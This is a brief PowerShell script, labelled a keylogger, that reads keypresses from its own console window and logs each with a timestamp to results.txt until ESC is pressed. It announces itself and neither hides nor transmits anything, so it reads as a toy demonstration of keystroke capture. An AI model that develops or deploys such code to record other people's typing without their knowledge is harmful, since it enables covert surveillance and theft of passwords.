# Ensure log file exists
$logFile = "results.txt"

if (!(Test-Path $logFile)) {
    New-Item -Path $logFile -ItemType File -Force | Out-Null
}

Write-Host "Keylogger started. Press ESC to stop."

while ($true) {
    $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode
    if ($key -eq 27) { break }
    Add-Content -Path $logFile -Value "$(Get-Date) - Key Pressed: $([char]$key) (Code: $key)"
}

Write-Host "Keylogger stopped."
